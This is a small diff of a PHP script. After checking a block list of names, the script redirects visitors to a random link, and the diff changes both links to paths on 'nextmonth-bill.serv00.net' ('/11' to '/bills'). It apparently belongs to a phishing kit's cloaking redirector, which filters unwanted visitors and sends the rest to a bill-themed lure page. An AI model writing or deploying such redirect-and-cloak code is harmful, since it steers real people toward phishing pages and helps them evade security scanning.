@@ -77,8 +77,8 @@ foreach ($black_list as $blocked_name) {
 
 // Redirect to a random link
 $links = [
-    "https://nextmonth-bill.serv00.net/11",
-    "https://nextmonth-bill.serv00.net/11", 
+    "https://nextmonth-bill.serv00.net/bills",
+    "https://nextmonth-bill.serv00.net/bills", 
 ];
 
 $random_link = $links[array_rand($links)];
